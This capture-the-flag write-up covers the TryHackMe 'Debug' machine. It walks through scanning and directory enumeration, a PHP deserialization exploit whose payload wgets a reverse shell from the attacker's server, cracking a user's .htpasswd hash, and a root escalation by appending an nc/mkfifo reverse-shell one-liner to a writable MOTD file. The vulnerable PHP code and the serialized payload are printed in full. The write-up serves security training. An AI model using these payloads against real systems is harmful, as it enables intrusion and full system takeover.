
[TryHackMe Link](https://tryhackme.com/room/debug){ .md-button }

!!! example "Description"

    <p id="desc" style="font-size:15px"></p>

## <b>Scanning</b>

* Assigned IP address: &nbsp; <b id="ip" style="color:purple"></b>
  
* Open Ports: 

| <p style="font-size:14px; color: black">PORT</p>      | <p style="font-size:14px; color: black">SERVICE</p> |  <p style="font-size:14px; color: black">DESCRIPTION                          |
| :---------: | :---------: | :----------------------------------: |
| <p id="p1" style="font-size:14px; color: purple"></p>      | <p id="s1" style="font-size:14px; color: purple"></p>  |<p id="d1" style="font-size:14px; color: purple"></p>   |
| <p id="p2" style="font-size:14px;  color: purple"></p>     | <p id="s2" style="font-size:14px; color: purple"></p>  |<p id="d2" style="font-size:14px; color: purple"></p> |


* Nmap Report:
  ```s linenums="1" hl_lines="6 11"
    # Nmap 7.93 scan initiated Sat Nov 18 10:58:51 2023 as: nmap -sC -sV -O -oN nmap.sh 10.10.155.251
    Nmap scan report for 10.10.155.251
    Host is up (0.38s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 44ee1eba072a5469ff11e349d7dba901 (RSA)
    |   256 8b2a8fd8409533d5fa7a406a7f29e403 (ECDSA)
    |_  256 6559e4402ac2d70577b3af60dacdfc67 (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-title: Apache2 Ubuntu Default Page: It works
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.93%E=4%D=11/18%OT=22%CT=1%CU=36574%PV=Y%DS=5%DC=I%G=Y%TM=6558DF
    OS:68%P=aarch64-unknown-linux-gnu)SEQ(SP=109%GCD=1%ISR=10A%TI=Z%II=I%TS=A)S
    OS:EQ(SP=109%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST
    OS:11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=6
    OS:8DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M
    OS:508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T
    OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
    OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
    OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
    OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

    Network Distance: 5 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Sat Nov 18 10:59:36 2023 -- 1 IP address (1 host up) scanned in 45.84 seconds

  ```

## <b>Enumeration</b>

In the initial exploration, I visited the default HTTP port 80 and encountered a website displaying the typical Apache welcome page. 

<img id="image1" />

Then, I used the feroxbuster tool for directory enumeration that revealed a hidden directory named **backup** within the `/html` directory.

<img id="image2" />

Within this directory, I discovered a backup file containing `PHP` and HTML-related files. 

<img id="image3" />

I smelled a rat particularly around a PHP file hinting at a `PHP deserialization` vulnerability. Analyzing the code, I identified a PHP class associated with an HTML form comprising two variables, namely `form_file` and `message`.

```php linenums="1" hl_lines="21-24"
<?php

class FormSubmit {
public $form_file = 'message.txt';
public $message = '';
public function SaveMessage() {
$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];
	$this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";
}

public function __destruct() {
file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';
}

}

// Leaving this for now... only for debug purposes... do not touch!
$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);
$application = new FormSubmit;
$application -> SaveMessage();
?>
```

This code segment caught my attention, as it attempted to unserialize an object based on user input from the GET parameter.

```php
$debug = $_GET['debug'] ?? ''; 
$messageDebug = unserialize($debug); 
```

Further examination revealed a **destructor** function executed during termination, creating or appending a file on the web server. This showed a classic insecure object serialization vulnerability.

## <b>Initial Access</b>

I crafted a **payload.php** with same PHP class and variables, and I created a system command to download a reverse shell from my Python server.

```php
<?php

/**
 * 
 */
class FormSubmit
{
	public $form_file = 'file.php';
	public $message = '<?php system("wget http://10.17.3.217:8000/shell.php -O shell.php") ?>';
}
$obj = new FormSubmit();
echo serialize($obj);

?>
```

Upon executing this PHP file, I obtained its associated serialized object. 

```s
O:10:"FormSubmit":2:{s:9:"form_file";s:8:"file.php";s:7:"message";s:70:"<?php system("wget http://10.17.3.217:8000/shell.php -O shell.php") ?>";}
```

The website had a form request and Using Burp Suite, I intercepted the form request and customised debug parameter to my requirements. 

<img id="image4" />

Injecting the serialized payload into the `debug` parameter, the object was deserialized, extracting the values of **form_file** and **message** I provided.

<img id="image5" />

<img id="image6" />

Assuming that `file.php` was already created, I accessed the file while listening on my end, immediately got a reverse shell. 

```
http://10.10.155.251/shell.php
```

<img id="image7" />

## Privilege Escalation

### Gaining user access (James)

The current user was identified as `www-html`. Seeking to escalate privileges, I explored the **/home** directory and discovered a user named `james`. Running linpeas.sh and inspecting hidden files, I located `.htpasswd`, containing James's password hash. Using hashcat, I successfully decrypted the password.

```
james:$apr1$zPZx2A{--REDACTED--}3b9UTt9Nq1
```

Closing the current shell, I logged in via the SSH service on port 22, finding the **user.txt** flag. 

### Gaining root access

Subsequently, my focus shifted to elevating privileges to root. A note in the system: `Note-To-James.txt` hinted at a custom SSH banner. 

```
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it? 

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :) 

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

rootv
```

Researching online, I discovered that modifying the **MOTD** file in the `/etc/` directory could achieve this. Upon locating the motd file, identified as executable and writable, I appended a reverse shell code, ultimately achieving root access!

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.17.3.217 5432 >/tmp/f
```

<img id="image8" />

<script>

// JSON object
const data = {
    "desc": "Linux Machine CTF! You'll learn about enumeration, finding hidden password files and how to exploit php deserialization!",
    "ip":  "10.10.155.251",
    "ports": "22/tcp,ssh,OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux protocol 2.0);80/tcp,http,Apache httpd 2.4.18 ((Ubuntu))",
    "difficulty":"medium",
    "id": "5"
}


function updateHTML() {

    const keys = Object.keys(data);
    const values = Object.values(data);

    for(var z=0; z < keys.length; z++){

        if(keys[z] === "ports"){
            const ports = data.ports.split(';');
            for(var i = 0; i < ports.length; i++){
                document.getElementById("p"+(i+1)).innerHTML = ports[i].split(',')[0].toUpperCase();
                document.getElementById("s"+(i+1)).innerHTML = ports[i].split(',')[1].toUpperCase();
                document.getElementById("d"+(i+1)).innerHTML = ports[i].split(',')[2];
            }
        }
        else{
            try{
            document.getElementById(keys[z]).innerHTML = values[z];
            }
            catch(error){
                console.log(values[z]);
            }
        }
    }

    // replace the values with your specific filenames and number of images and img tags
    const numImgTags = document.getElementsByTagName('img').length;

    for (let i = 1; i <= numImgTags; i++) {
    const imgTag = document.getElementById('image' + i);
        if (imgTag) {
            imgTag.src = '../images/'+data.difficulty[0]+data.id+'-image' + i + '.png';
        }
    }


}

updateHTML();
</script>